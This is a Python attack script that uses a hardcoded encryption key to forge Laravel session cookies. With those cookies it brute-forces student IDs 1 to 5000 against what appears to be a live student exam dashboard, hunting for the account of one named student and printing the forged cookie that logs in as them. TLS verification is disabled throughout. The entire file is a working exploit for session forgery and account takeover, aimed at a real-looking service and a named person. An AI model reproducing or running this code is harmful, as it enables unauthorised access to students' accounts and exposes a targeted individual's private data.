import base64, json, requests
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

KEY = base64.b64decode("kbqL/05YWl0TZEnb3oE4811UauhKhWps9c4IWsQiFHQ=")

def forge(uid):
    payload = {"id": uid, "login_web_59ba36addc2b2f9401580f014c7f58ea4e30989d": uid}
    iv = AES.get_random_bytes(16)
    cipher = AES.new(KEY, AES.MODE_CBC, iv)
    enc = cipher.encrypt(pad(json.dumps(payload).encode(), AES.block_size))
    final = base64.b64encode(json.dumps({"iv": base64.b64encode(iv).decode(), "value": base64.b64encode(enc).decode()}).encode()).decode()
    return final

print("[*] Brute-forcing student IDs 1 to 5000...")
for uid in range(1, 5001):
    cookie = forge(uid)
    resp = requests.get("https://student.citexams.in/dashboard", 
                        cookies={"laravel_session": cookie}, 
                        verify=False, allow_redirects=False)
    if resp.status_code == 200 and ("AFNAN" in resp.text or "TARIQ" in resp.text):
        print(f"\n[+] FOUND AFNAN TARIQ at ID: {uid}")
        print(f"[+] Cookie: {cookie}")
        break
    if uid % 500 == 0:
        print(f"[-] Tried up to ID {uid}...")